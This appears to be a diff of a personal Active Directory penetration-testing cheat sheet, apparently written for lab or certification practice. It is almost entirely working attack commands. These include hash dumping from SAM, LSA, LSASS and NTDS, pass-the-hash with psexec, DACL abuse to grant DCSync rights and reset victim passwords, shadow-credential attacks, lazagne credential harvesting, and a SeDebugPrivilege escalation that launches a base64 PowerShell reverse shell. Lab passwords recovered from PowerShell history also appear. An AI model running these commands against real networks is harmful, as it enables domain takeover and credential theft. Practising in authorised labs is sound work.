+ON EVERY MACHINE , REMOTELY DUMP HASHES : 
 
 now we can dump hashes
 first the user you have access on that machine to the administrators group
@@ -8543,9 +8962,36 @@ check if it says `pwned or not` i.e if the `user` is admin already on a machine 
 netexec smb iplist.txt -u 'username' -p 'password'
 ```
 
+-------
+
+If password dumping and spraying doesn't work for all combinations , 
+
+see in bloodhound , 
+your owned accounts 
+profile 
+have outbound control on whom all
+
+--------
+
+check powershell history
+
 ----
 
-Check in `C:\` folder if you have any not original file like `windows.old` and if it has sam and system which you can download and dump
+Check in `C:\` folder
+
+for any uncommon folder 
+
+if you have any not original file like `windows.old` and if it has sam and system which you can download/transfer back to kali and dump
+```
+# Extract historical registry hives
+reg save C:\windows.old\Windows\System32\config\SAM SAM_old
+reg save C:\windows.old\Windows\System32\config\SYSTEM SYSTEM_old
+```
+then : 
+```
+impacket-secretsdump -sam SAM_old -system SYSTEM_old LOCAL
+# Extract secrets from historical registry hives
+```
 
 ---------
 
@@ -8559,6 +9005,23 @@ dump ntds for hashes of all the users in the entire domain
 ----
 
 check powershell history
+
+---
+
+No Creds Found?
+- Search the filesystem for suspicious files/folders containing potential creds
+
+---
+
+**Pay attention if any of your owned users have Outbound Privileges using BloodHound (GenericAll etc.), double check for asreproastable and kerberoastable users.(run manually also even if bloodhound doesn't show)** 
+
+---
+
+lazagne:
+```
+.\lazagne.exe all
+```
+
 
 ## ==🟢Tools Setup & Run :== 
 
@@ -9405,7 +9868,11 @@ KEEP THE `' '` AS IT IS
 ==🔵Uses SMB to authenticate with the NTLM hash :==
 Gives Command shell
 ```
-impacket-psexec 'CONTROLLER.local/Administrator@<TARGET_IP>' -hashes '<LM_HASH>:<NT_HASH>'
+impacket-psexec CONTROLLER.local/administrator@<DC_IP> -hashes :<NT_HASH>
+```
+OR
+```
+impacket-psexec 'CONTROLLER.local/administrator@<TARGET_IP>' -hashes '<LM_HASH>:<NT_HASH>'
 ```
 
 ==🔵using RPC/WMI:==
@@ -9431,8 +9898,8 @@ World writeable :
 cd C:\Windows\Tasks (Preferred)
 cd C:\Windows\Temp
 ```
-### ==🔴BloodHound : ==
-##### ==🔴Start : ==
+### ==🔵BloodHound : ==
+##### ==🔴Setup : ==
 
 ```
 sudo docker-compose up -d
@@ -9509,6 +9976,7 @@ make yourself the owner of the first first
 impacket-owneredit -action write \
   -new-owner '<attacker username>' \
   -target '<victim username>' \
+  -dc-ip <DC IP> \
   '<DOMAIN NAME>'/'<attacker username>':'<attacker password>'
 ```
 
@@ -9518,11 +9986,30 @@ impacket-dacledit -action write \
   -rights FullControl \
   -principal '<attacker username>' \
   -target '<victim username>' \
+  -dc-ip <DC IP> \
   '<DOMAIN NAME>'/'<attacker username>':'<attacker password>'
 ```
 
-
 NOW PERFORM THE ATTACK : 
+
+==🔴ATTACK 1 : CHANGE THE PASSWORD OF THE VICTIM USER : ==
+
+Change the password of victim : 
+```
+net rpc password "<victim username>" "<victim new password>" -U "<DOMAIN NAME>"/"<attacker username>"%"<attacker password>" -S "<DC IP>"
+```
+
+Check if it got changed or not :
+```
+netexec smb iplist.txt -u <victim username> -p '<victim new password>'
+```
+try again if didnt work with a stronger password
+
+NOW AGAIN DO USERNAME AND PASSWORD SPRAY OVER ALL 3 PROTOCOLS WITH THE NEW USERNAME AND PASSWORD ADDED
+
+
+
+==🔴ATTACK 2 : TO GET `NT` hash of the user : ==
 
 Shadow Credentials attack :
 when entering username and password/hash see bloodhound again which user you are exactly attacking from
@@ -9537,7 +10024,7 @@ if you have a password :
 certipy-ad shadow auto -u '<CURRENT USERNAME>'@<DOMAIN NAME> -p '<CURRENT USER PASSWORD>' -account '<TAGRET USERNAME>'
 ```
 fix the error : `KRB_AP_ERR_SKEW(Clock skew too great)` if it comes
-we get the `NT` hash of the user
+
 now enumerate for AD CS 
 
 ###### ==🔵OVER A GROUP : ==
@@ -9633,23 +10120,26 @@ IF IT DOESNT SHOW YOUR USERNAME HERE , THEN RUN THE `ADDMEMBER` COMMAND AGAIN AN
 
 ##### ==🔴WriteDacl (Exchange Windows Permissions)==
 
+If User has `WriteDacl` over the entire `domain name`
+
 This means If we are part of this group we can grant ourself `DCSync rights`.
 
 on kali :
+For `-target-dn` in bloodhound , click on the profile on domain name > `Distinguished Name`
 ```
-impacket-dacledit -action 'write' -rights 'DCSync' -principal '<username>' -target-dn 'DC=htb,DC=local' '<domain name>'/'<username>':'<Password>'
+impacket-dacledit -action 'write' -rights 'DCSync' -principal '<username>' -target-dn 'DC=htb,DC=local' '<domain name>'/'<username>':'<Password>' -dc-ip <DC IP>
 ```
 example :
 ```
 impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=htb,DC=local' 'htb.local'/'svc-alfresco':'s3rvice'
 ```
 
+==🔴now run DCSync and then pass the hash of administrator==
+
 (FROM PREVIOUS GENERICALL COMMANDS) :
 
 IF IT DOESNT' WORK THEN AGAIN RUN THE `VERIFY` COMMAND TO CHECK OF YOUR USERNAME IS ADDED TO THE GROUP OR NOT
 THEN RUN THE `ADDMEMBER` COMMAND AGAIN AND THEN AGAIN RUN THE `VERIFY` COMMAND
-
-now run DCSync and then pass the hash of administrator
 
 ### ==🔵DCSync : ==
 
@@ -9663,12 +10153,14 @@ then try DC SYNC
 
 run DCSync attack using Impacket’s `secretsdump.py`:
 ```
-impacket-secretsdump vulnnet-rst.local/<username>@<target-ip>
+impacket-secretsdump 'hack-academy.local'/'<username>':'<Password>'@<dc ip>
 ```
 OR
 ```
-impacket-secretsdump 'hack-academy.local'/'<username>':'<Password>'@'<dc ip>'
+impacket-secretsdump vulnnet-rst.local/<username>@<target-ip>
 ```
+
+On top will be the domain administrator hash
 
 Only this category is of our use : 
 ```
@@ -9706,7 +10198,7 @@ Our user (`<current username`) is listed.
 
 #### ==🔴Privilege Attacks==
 
-###### ==🔵to check current privileges==
+##### ==🔵to check current privileges==
 ```
 whoami /priv
 whoami /all
@@ -9717,7 +10209,7 @@ whoami /all
 ```
 systeminfo
 ```
-###### ==🔵if SeImpersonatePrivilege : Disabled : ==
+##### ==🔵if SeImpersonatePrivilege : Disabled : ==
 Full powers : 
 ```
 https://github.com/itm4n/FullPowers
@@ -9727,6 +10219,54 @@ run :
 ```
 .\FullPowers.exe
 ```
+
+##### ==🔵SeDebugPrivilege : ==
+
+Go to 
+```
+https://github.com/bruno-1337/SeDebugPrivilege-Exploit/releases
+```
+download :
+```
+SeDebugPrivesc.exe
+```
+
+transfer to windows victim
+
+Go to https://www.revshells.com/
+Use Reverse > windows > PowerShell #3 (Base64)
+enter kali ip and port
+copy the payload
+
+start listener on kali 
+
+
+Now in the victim shell : 
+search all the processes : 
+If in cmd : 
+```
+powershell -c 'ps'
+```
+If in powershell : 
+```
+ps
+```
+see only the last column `ProcessName` and the 3rd last column `Id` for the process ID 
+
+If it gives error `Failed to open process` then try another process id and its process name
+
+Identify a suitable SYSTEM-owned process, such as `lsass` or `winlogon` or  `vmtoolssd` or `smss` or `conhost` process ID
+or any other try one by one
+
+Usage
+```
+.\SeDebugPrivesc.exe <PID> <Copied Reverse shell>
+```
+you will get a listener back 
+you should get shell as `nt autority\system` if it's a different username , try with another process ID
+
+now again add user to admin and dump hashes
+you can check in your previous shell by `whoami` to see which user to add to admins
 
 ##### ==🔵SeImpersonate/SeAssignPrimaryToken Privilege==
 
@@ -10418,16 +10958,20 @@ then :
 
 #### ==🟢Weak Registry Permissions (changing path of executable in registry)==
 
-Or see Windows privilege escalation > Registry Attacks > Weak Registry Permissions (changing path of executable in registry)
+OR USE Winpeas : 
+See Windows privilege escalation > Registry Attacks > Weak Registry Permissions (changing path of executable in registry)
 
 ----
 
+OR use `PrivescCheck` :
 Severity : High
 
 TA0004
 Name : Services : Registry permissions 
 
 Modifiable path : `<has a registry path>`
+
+----
 
 now we get details about this service in registry for full `ImagePath`
 ```
@@ -10444,7 +10988,8 @@ Look for `Access : NT AUTHORITY\INTERACTIVE Allow  FullControl`
 now we make a reverse shell 
 switch to :temp folder on windows :
 ```
-cd C:\temp
+cd C:\temp or tasks
+or c:\windows\tasks or temp
 ```
 download on windows :
 ```
@@ -10462,6 +11007,7 @@ sc qc regsvc
 ```
 also check `BINARY_PATH_NAME` here to see if path changed or not
 if it says `START_TYPE : DEMAND_START` , we can start it manually
+or if it says `START_TYPE : AUTO_START` and we have SeShutdown privilege , we can restart the machine and get shell
 
 start listener on kali 
 ```
@@ -10497,12 +11043,16 @@ it will take up some time to receive
 
 ==🔴requires admin system shell==
 
-add your existing username which you already have credentials of to the administrator group
+==🟡add your existing username which you already have credentials of to the administrator group==
 ```
 net localgroup administrators <USERNAME> /add
 
 #to clean up after full compromise is done : 
 #net localgroup administrators <USERNAME> /del
+```
+Check if it says `pwned!` now or not:
+```
+netexec smb iplist.txt -u 'hclarke' -p 'Cuba-libre72'
 ```
 
 ==🔴also instead of a single ip here replace it with the ip list==
@@ -10512,28 +11062,22 @@ iplist.txt
 
 ==🔴PAY ATTENTION TO THE USERS WHICH YOU HAVE NOT YET SEEN
 CHECK IN BLOODHOUND IF THEY ARE DOMAIN ADMINS OR NOT==
-
 Remember : 
 ```
 DOMAIN NAME\administrator
 ```
 If you find the administrator in this format , it's the domain admin
-
-```
-USE THE IPLIST INSTEAD OF THE SINGLE IP
-```
-
-==🔴see if you get any DC user like : ==
+see if you get any DC user like :
 ```
 HACK-ACADEMY.LOCAL/price
 ```
 
-==🟡Remember to dump sam , lsa , lsass all Because all can have different credentials==
+==🟡Remember to dump all 3 : sam , lsa , lsass all Because all can have different credentials==
 
 ==🔴**Dump SAM - requires local admin==**
 ==🔴use the ip here of the machine you are admin on ==
 ```
-netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --sam
+netexec smb iplist.txt -u 'user1' -p 'Password1!' --sam
 
 netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --sam | fgrep -v '[' | awk -F: '{print $4}' | tee dumped_hashes.txt
 ```
@@ -10564,7 +11108,7 @@ THEN CRACK THOSE HASHES, COMMAND IS BELOW
 
 netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --lsa secdump
 ```
-**Cracking mscash:** (copy full hash)
+**Cracking mscash (since you cannot relay this hash):** (copy full hash from the domain name till end `:`)
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=mscash2 mscash_hashes 
 ```
@@ -10582,9 +11126,15 @@ https://github.com/openwall/john-packages/releases
 john.exe --format=mscash2-opencl --device=1 --wordlist=rockyou.txt hashes.txt
 ```
 
+If you had earlier also cracked the hash and john is not cracking it now , remove last log
+```
+gedit ~/.john/john.pot
+#and remove everything from here
+```
+
 ---
 
-**Dump NTDS.dit - Requires domain admin or local ==🔴admin on Domain Controller==**
+==🔴**Dump NTDS.dit - Requires domain admin or local admin on Domain Controller==**
 do dump all hashes of all the users in the domain
 ```
 netexec smb <DC IP> -u 'administrator' -p 'Password1!' --ntds
@@ -10684,6 +11234,81 @@ switch to PowerShell :
 ```
 PowerShell
 ```
+
+---
+
+**Check the PowerShell history location**
+Run this inside your Evil-WinRM session:
+```
+(Get-PSReadlineOption).HistorySavePath
+```
+This command tells you where the current user's command history is stored.
+
+**Try the expected history file**
+```
+type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt
+```
+Your output:
+```
+Cannot find path ... because it does not exist.
+```
+This means that particular file was not present. It does not mean PowerShell history was unavailable.
+
+Navigate to the PSReadLine directory
+```
+cd C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+```
+Check its contents:
+```
+dir
+```
+the relevant file was named `ConsoleHost_history.txt`, not `ServerRemoteHost_history.txt`.
+
+Read the command history
+```
+type ConsoleHost_history.txt
+```
+Or:
+```
+Get-Content ConsoleHost_history.txt
+```
+recorded output:
+```
+C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
+C:\users\support\admintool.exe cmd
+
+shutdown /r /t 7
+```
+This is the important discovery.
+The first command shows that someone previously executed:
+```
+C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
+```
+The value `hghgib6vHT3bVWf` was supplied as an argument to AdminTool.
+
+Check the backup history file
+```
+type ConsoleHost_history.txt.1
+```
+Output:
+```
+C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
+C:\users\support\admintool.exe cmd
+```
+This confirmed that the same command appeared in another saved history file.
+
+Use the discovered credential on MS02
+From your Kali terminal, you then tried the discovered value against MS02:
+```
+evil-winrm -i 10.10.143.154 -u Administrator -p 'hghgib6vHT3bVWf'
+```
+Verify the account:
+```
+whoami
+```
+You obtained Administrator access to MS02.
+
+----
 
 LOOK FOR `PSCredential ('svc_deploy', $p)` THE FIRST ONE IN BRACKETS WILL BE THE USERNAME
 ```
@@ -10991,6 +11616,8 @@ w32tm /query /status
 ### ==🔵Resource-Based Constrained Delegation - RBCD : ==
 
 ## ==🟢Maintaining Access (Persistence) :==
+
+#### ==🔵Add new user to domain admin group on DC==
 
 This is enough :
 
